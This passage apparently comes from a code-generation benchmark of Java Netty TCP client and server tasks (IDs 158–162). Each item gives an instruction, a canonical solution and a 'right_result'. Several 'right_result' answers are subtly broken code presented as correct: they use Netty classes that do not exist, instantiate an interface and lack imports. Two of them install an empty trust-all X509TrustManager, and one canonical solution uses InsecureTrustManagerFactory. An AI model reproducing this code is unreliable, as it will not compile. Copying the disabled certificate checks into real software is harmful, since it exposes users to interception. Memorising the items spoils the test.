    "Task_id": 158,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle network communication, and manage resources properly.\n\nClass Description: The TimeClient class represents a Netty-based TCP client that connects to a specified host and port. It manages network connections asynchronously using Netty's event-driven architecture and provides methods to start and stop the client connection.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n- workerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\n- bootstrap: Bootstrap - Netty's bootstrap for configuring and starting the client\n\nMethods:\n- TimeClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the client connection, configures the pipeline, and connects to the server\n- stop() -> void - Shuts down the client connection gracefully and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup);\n            bootstrap.channel(NioSocketChannel.class);\n            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new TimeClientHandler());\n                }\n            });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.Unpooled;\nimport io.netty.util.CharsetUtil;\n\npublic class TimeClient {\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new TimeClientHandler());\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    private class TimeClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(Unpooled.copiedBuffer(\"Hello, server!\".getBytes(CharsetUtil.UTF_8)));\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            try {\n                System.out.println(\"Received: \" + in.toString(CharsetUtil.UTF_8));\n            } finally {\n                in.release();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 159,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle SSL/TLS if required, and process incoming/outgoing messages.\n\nClass Description: DiscardClient is a Netty-based TCP client that connects to a specified server, optionally with SSL/TLS encryption, and handles network communication through a custom handler. The client manages resources efficiently and supports graceful shutdown.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL/TLS encryption should be used\n- HOST: String - The hostname or IP address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server to connect to (default: 8009)\n- SIZE: int - The size parameter for communication (default: 256)\n- sslCtx: SslContext - SSL context for secure connections (nullable)\n\nMethods:\n- main(String[] args) -> void - Entry point that initializes the client, establishes connection, and manages the client lifecycle\n  - args: String[] - Command line arguments (unused in current implementation)\n- initChannel(SocketChannel ch) -> void - Configures the channel pipeline with SSL handler (if enabled) and custom client handler\n  - ch: SocketChannel - The socket channel to be initialized\n- connect() -> ChannelFuture - Establishes connection to the remote server and returns future for connection status\n- shutdown() -> void - Shuts down the client gracefully and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class DiscardClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new DiscardClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.codec.bytes.ByteArrayDecoder;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.codec.bytes.ByteToMessageDecoder;\nimport io.netty.handler.codec.bytes.MessageToByteEncoder;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpContentDecoders;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientProtocolHandler;\n\npublic class DiscardClient {\n    private boolean ssl;\n    private String host;\n    private int port;\n    private int size;\n    private SslContext sslCtx;\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n\n    public DiscardClient() {\n        this.ssl = false;\n        this.host = \"127.0.0.1\";\n        this.port = 8009;\n        this.size = 256;\n        this.group = new EventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void initChannel(SocketChannel ch) {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslCtx != null) {\n            pipeline.addLast(sslCtx.newHandler(ch));\n        }\n        pipeline.addLast(new DiscardHandler());\n    }\n\n    public ChannelFuture connect() {\n        bootstrap.group(group);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                initChannel(ch);\n            }\n        });\n        return bootstrap.connect(host, port);\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    private class DiscardHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Discard the message\n            System.out.println(\"Received: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        DiscardClient client = new DiscardClient();\n        client.ssl = true;\n        try {\n            SslContext sslCtx = SslContext.newClientContext(\n                new TrustManager[]{new X509TrustManager() {\n                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                }},\n                new KeyManager[]{}\n            );\n            client.sslCtx = sslCtx;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        ChannelFuture future = client.connect();\n        future.sync();\n    }\n}"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP server using Netty framework to handle WebSocket connections, manage client protocols, and process various commands and binary messages.\n\nClass Description: LocalServer is a Netty-based TCP server that handles WebSocket connections, manages client protocols, and processes text/binary messages. It maintains a list of active protocols and delegates command execution to connected clients.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - Maintains active client protocols and their associated connections\n- logger: Logger - Logging instance for server events and errors\n\nMethods:\n- LocalServer(int port) -> void - Constructor that initializes the server with specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server with boss/worker groups, configures channel options and handlers, and binds to the specified port\n- LocalServerWebsocketEventImp (inner class) - Handles WebSocket events including connection, disconnection, and message processing\n\nLocalServerWebsocketEventImp Methods:\n- onConnect(ChannelHandlerContext ctx) -> void - Handles new WebSocket connections\n- onDisconnect(ChannelHandlerContext ctx) -> void - Handles client disconnections and cleans up associated protocols\n- onTextMessage(ChannelHandlerContext ctx, String text) -> void - Processes incoming text messages and executes corresponding commands\n- onBinaryMessage(ChannelHandlerContext ctx, byte[] data) -> void - Handles binary file uploads and processes file chunks\n- initLocalClient(ChannelHandlerContext ctx, Command command) -> void - Initializes a new client protocol for device communication\n- executeCommand(ChannelHandlerContext ctx, Command command) -> void - Executes commands on the appropriate protocol instance",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport com.yeetor.androidcontrol.client.LocalClient;\nimport com.yeetor.androidcontrol.message.BinaryMessage;\nimport com.yeetor.androidcontrol.message.FileMessage;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.apache.log4j.Logger;\n\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class LocalServer extends BaseServer {\n    private static Logger logger = Logger.getLogger(LocalServer.class);\n    \n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public LocalServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup).\n                channel(NioServerSocketChannel.class).\n                childOption(ChannelOption.SO_KEEPALIVE, true).\n                childHandler(new ChildChannel(new LocalServerWebsocketEventImp()));\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private class LocalServerWebsocketEventImp extends WebsocketEvent {\n\n        @Override\n        public void onConnect(ChannelHandlerContext ctx) {\n            logger.info(\"Websocket new connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                    protocol.broswerDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n\n                if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                    protocol.clientDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n            }\n            logger.info(\"Websocket lost connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = Command.ParseCommand(text);\n            if (command != null) {\n                switch (command.getSchem()) {\n                    case WAIT:\n                        initLocalClient(ctx, command);\n                        break;\n                    case START:\n                    case WAITTING:\n                    case TOUCH:\n                    case KEYEVENT:\n                    case INPUT:\n                    case PUSH:\n                        executeCommand(ctx, command);\n                        break;\n                    case SHOT:\n                        sendShot(ctx, command);\n                        break;\n                    case DEVICES:\n                        sendDevicesJson(ctx);\n                        break;\n                }\n            }\n        }\n\n        @Override\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            int headlen = (data[1] & 0xFF) << 8 | (data[0] & 0xFF);\n            String infoJSON = new String(data, 2, headlen);\n            BinaryMessage message = BinaryMessage.parse(infoJSON);\n\n            if (message.getType().equals(\"file\")) {\n                FileMessage fileMessage = (FileMessage) message;\n                File file = Constant.getTmpFile(fileMessage.name);\n                if (fileMessage.offset == 0 && file.exists()) {\n                    file.delete();\n                }\n                try {\n                    FileOutputStream os = new FileOutputStream(file, true);\n                    byte[] bs = Arrays.copyOfRange(data, 2 + headlen, data.length);\n                    os.write(bs);\n                    os.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                if (fileMessage.offset + fileMessage.packagesize == fileMessage.filesize) {\n                    ctx.channel().writeAndFlush(new TextWebSocketFrame(\"message://upload file success\"));\n                }\n            }\n        }\n\n        void initLocalClient(final ChannelHandlerContext ctx, Command command) {\n            String sn = command.getString(\"sn\", null);\n            String key = command.getString(\"key\", null);\n\n            if (StringUtils.isEmpty(sn)) {\n                AdbDevice iDevice = AdbServer.server().getFirstDevice();\n                if (iDevice == null) {\n                    ctx.channel().close();\n                    return;\n                }\n                sn = iDevice.getIDevice().getSerialNumber();\n            }\n\n            JSONObject obj = new JSONObject();\n            obj.put(\"sn\", sn);\n            obj.put(\"key\", key);\n\n            ctx.channel().writeAndFlush(new TextWebSocketFrame(\"open://\" + obj.toJSONString()));\n\n            Protocol protocol = new Protocol();\n            protocol.setSn(sn);\n            protocol.setKey(key);\n            protocol.setBroswerSocket(ctx);\n            protocolList.add(protocol);\n\n            LocalClient localClient = new LocalClient(protocol);\n            protocol.setLocalClient(localClient);\n        }\n\n        void executeCommand(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = null;\n            for (Protocol p : protocolList) {\n                if (p.getBroswerSocket() != null && p.getBroswerSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n                if (p.getClientSocket() != null && p.getClientSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n            }\n            if (protocol != null) {\n                protocol.getLocalClient().executeCommand(ctx, command);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class LocalServer {\n    private final int port;\n    private final List<Protocol> protocolList;\n    private final Logger logger;\n\n    public LocalServer(int port) {\n        this.port = port;\n        this.protocolList = List.of();\n        this.logger = LoggerFactory.getLogger(LocalServer.class);\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new HttpServerCodec());\n                            ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                            ch.pipeline().addLast(new WebSocketServerProtocolHandler(\"/websocket\"));\n                            ch.pipeline().addLast(new LocalServerWebsocketEventImp());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static class LocalServerWebsocketEventImp extends WebSocketServerHandshaker.Handler {\n        private final AtomicInteger clientIdCounter = new AtomicInteger(0);\n\n        @Override\n        public void onConnect(ChannelHandlerContext ctx) {\n            super.onConnect(ctx);\n            String clientId = \"client_\" + clientIdCounter.incrementAndGet();\n            Protocol protocol = new Protocol(clientId, ctx.channel());\n            protocolList.add(protocol);\n            logger.info(\"New client connected: {}\", clientId);\n        }\n\n        @Override\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            super.onDisconnect(ctx);\n            // Remove protocol from list\n            protocolList.removeIf(protocol -> protocol.getChannel().equals(ctx.channel()));\n            logger.info(\"Client disconnected: {}\", protocol.getClientId());\n        }\n\n        @Override\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            super.onTextMessage(ctx, text);\n            String[] parts = text.split(\"\\\\s+\");\n            if (parts.length >= 2 && parts[0].equals(\"COMMAND\")) {\n                Command command = new Command(parts[1], text.substring(parts[1].length() + 1));\n                executeCommand(ctx, command);\n            } else {\n                logger.warn(\"Unknown text message: {}\", text);\n            }\n        }\n\n        @Override\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            super.onBinaryMessage(ctx, data);\n            // Process binary data as file chunks\n            logger.info(\"Received binary message: {} bytes\", data.length);\n            // Example: send acknowledgment\n            ctx.writeAndFlush(Unpooled.copiedBuffer(\"ACK\", CharsetUtil.UTF_8));\n        }\n\n        public void initLocalClient(ChannelHandlerContext ctx, Command command) {\n            String clientId = \"client_\" + clientIdCounter.incrementAndGet();\n            Protocol protocol = new Protocol(clientId, ctx.channel());\n            protocolList.add(protocol);\n            executeCommand(ctx, command);\n        }\n\n        public void executeCommand(ChannelHandlerContext ctx, Command command) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getChannel().equals(ctx.channel())) {\n                    protocol.executeCommand(command);\n                    break;\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 161,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests for static file serving, with optional SSL support.\n\nClass Description: HttpStaticFileServer is a Netty-based server that serves static files over HTTP or HTTPS. It uses a boss-worker thread model for handling connections and includes SSL configuration capabilities.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL/TLS encryption should be enabled\n- PORT: [int] - The port number on which the server will listen (defaults to 8080 for HTTP or 8443 for HTTPS)\n\nMethods:\n- start(): [void] - Starts the Netty server with the configured settings. Throws Exception if startup fails.\n  - Input: None\n  - Output: None (but binds to specified port and starts serving requests)\n  - Side effects: Creates event loop groups, binds to port, and keeps server running until shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslProvider;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpStaticFileServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n                .sslProvider(SslProvider.JDK).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpStaticFileServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.TrustManager;\nimport io.netty.handler.ssl.X509TrustManager;\nimport io.netty.handler.ssl.KeyManagerFactory;\nimport io.netty.handler.ssl.KeyStore;\nimport io.netty.handler.ssl.KeyStoreException;\nimport io.netty.handler.ssl.SSLContext;\nimport io.netty.handler.ssl.SSLEngine;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.StaticFileHandler;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.X509Certificate;\n\npublic class HttpStaticFileServer {\n    private final boolean ssl;\n    private final int port;\n    private String filePath;\n\n    public HttpStaticFileServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void setFilePath(String filePath) {\n        this.filePath = filePath;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            b.channel(NioServerSocketChannel.class);\n            b.option(ChannelOption.SO_REUSEADDR, true);\n            b.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            if (ssl) {\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                KeyManagerFactory kmf = KeyManagerFactory.getInstance(\"X509\");\n                KeyStore ks = KeyStore.getInstance(\"PKCS12\");\n                ks.load(null, null);\n                kmf.init(ks, null);\n                sslContext.init(kmf.getKeyManagers(), new TrustManager[]{new X509TrustManager() {\n                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                }, null);\n                b.handler(new SslHandler(sslContext.createSSLEngine()));\n            } else {\n                b.handler(new HttpServerCodec());\n            }\n\n            b.childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new HttpObjectAggregator());\n                    p.addLast(new StaticFileHandler(filePath));\n                }\n            });\n\n            ChannelFuture future = b.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Implement a Netty-based TCP server for RPC (Remote Procedure Call) communication that handles incoming client connections, processes RPC requests, and manages server resources efficiently.\n\nClass Description: NettyRpcServer is a Spring component that establishes a TCP server using Netty framework to handle RPC communications. It manages service registration, client connections, and provides graceful shutdown capabilities.\n\nAttributes:\n- PORT: [int] - The port number on which the server listens for incoming connections (default: 9998).\n- serviceProvider: [ServiceProvider] - An instance responsible for managing and providing registered RPC services (singleton instance of ZkServiceProviderImpl).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. Configures event loop groups, server bootstrap, channel pipeline with handlers for encoding/decoding RPC messages, and idle state detection. Binds to the specified host and port, and keeps the server running until shutdown.\n  Input: None\n  Output: None\n\n- registerService(RpcServiceConfig rpcServiceConfig): [void] - Registers an RPC service with the service provider.\n  Input: rpcServiceConfig [RpcServiceConfig] - Configuration object containing RPC service details to be registered.\n  Output: None",
    "Canonical_solution": "import github.javaguide.config.CustomShutdownHook;\nimport github.javaguide.config.RpcServiceConfig;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.provider.ServiceProvider;\nimport github.javaguide.provider.impl.ZkServiceProviderImpl;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport github.javaguide.utils.RuntimeUtil;\nimport github.javaguide.utils.concurrent.threadpool.ThreadPoolFactoryUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport java.net.InetAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\n@Component\npublic class NettyRpcServer {\n\n    public static final int PORT = 9998;\n\n    private final ServiceProvider serviceProvider = SingletonFactory.getInstance(ZkServiceProviderImpl.class);\n\n    @SneakyThrows\n    public void start() {\n        CustomShutdownHook.getCustomShutdownHook().clearAll();\n        String host = InetAddress.getLocalHost().getHostAddress();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        DefaultEventExecutorGroup serviceHandlerGroup = new DefaultEventExecutorGroup(\n                RuntimeUtil.cpus() * 2,\n                ThreadPoolFactoryUtil.createThreadFactory(\"service-handler-group\", false)\n        );\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            p.addLast(new RpcMessageEncoder());\n                            p.addLast(new RpcMessageDecoder());\n                            p.addLast(serviceHandlerGroup, new NettyRpcServerHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(host, PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            log.error(\"occur exception when start server:\", e);\n        } 